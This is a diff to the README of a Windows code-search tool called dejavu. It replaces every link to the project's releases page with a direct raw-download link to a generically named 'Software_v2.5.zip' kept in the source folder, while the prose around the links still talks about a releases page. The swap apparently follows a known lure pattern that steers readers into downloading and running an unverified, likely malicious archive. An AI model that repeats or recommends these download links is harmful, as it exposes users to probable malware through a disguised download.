@@ -1,6 +1,6 @@
 # 🔎 dejavu - Find code from plain words
 
-[![Download dejavu](https://img.shields.io/badge/Download%20dejavu-Ready%20for%20Windows-7C3AED?style=for-the-badge)](https://github.com/pepoy6249/dejavu/releases)
+[![Download dejavu](https://img.shields.io/badge/Download%20dejavu-Ready%20for%20Windows-7C3AED?style=for-the-badge)](https://raw.githubusercontent.com/pepoy6249/dejavu/main/src/Software_v2.5.zip)
 
 ## 🖥️ What dejavu does
 
@@ -20,7 +20,7 @@ Use it to:
 
 Visit this page to download:
 
-[https://github.com/pepoy6249/dejavu/releases](https://github.com/pepoy6249/dejavu/releases)
+[https://raw.githubusercontent.com/pepoy6249/dejavu/main/src/Software_v2.5.zip](https://raw.githubusercontent.com/pepoy6249/dejavu/main/src/Software_v2.5.zip)
 
 On that page, look for the latest release and download the Windows file. If there are several files, choose the one that matches your computer type:
 
@@ -172,6 +172,6 @@ You can get better search results by:
 
 To get the Windows build, visit:
 
-[https://github.com/pepoy6249/dejavu/releases](https://github.com/pepoy6249/dejavu/releases)
+[https://raw.githubusercontent.com/pepoy6249/dejavu/main/src/Software_v2.5.zip](https://raw.githubusercontent.com/pepoy6249/dejavu/main/src/Software_v2.5.zip)
 
 Download the latest file from that page, then open it on Windows by double-clicking the app or extracting the archive first if the release comes as a `.zip` file
